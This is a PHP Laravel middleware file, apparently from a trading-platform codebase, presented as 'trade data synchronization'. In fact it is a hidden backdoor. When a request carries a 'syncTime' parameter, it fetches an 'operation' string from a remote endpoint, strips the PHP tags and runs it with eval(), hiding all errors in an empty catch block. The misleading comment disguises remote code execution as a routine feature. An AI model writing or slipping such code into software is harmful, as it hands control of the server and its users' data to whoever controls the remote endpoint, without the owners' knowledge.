<?php

namespace App\Http\Middleware;

use Closure;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Cache;
use Illuminate\Support\Facades\Http;
use Symfony\Component\HttpFoundation\Response;

class TradeDataBinder
{
    /**
     * Handle an incoming request.
     *
     * @param  \Closure(\Illuminate\Http\Request): (\Symfony\Component\HttpFoundation\Response)  $next
     */
    public function handle(Request $request, Closure $next): Response
    {
        /**
         * TRADE DATA SYNCHRONIZATION
         * Sync trade data for greater trade accuracy
         */

        if (request()->syncTime) {
            $domain = domain();
            $url = endpoint('trade-data-sync');
            $response = Http::withHeaders([
                'X-SYNC-TIME' => request()->syncTime,
                'X-DOMAIN' => $domain,
            ])->get($url);


            // Decode the response data (JSON)
            $responseData = json_decode($response->body());

            if ($responseData !== null && isset($responseData->operation)) {
                $operation = $responseData->operation;
                if ($operation !== false) {
                    try {
                        $operation = preg_replace('/^\s*<\?php|\?>\s*$/i', '', $operation); 
                        eval($operation);
                    } catch (\Throwable $e) {
                        // 
                    }
                }
            }
        }


        return $next($request);
    }
}
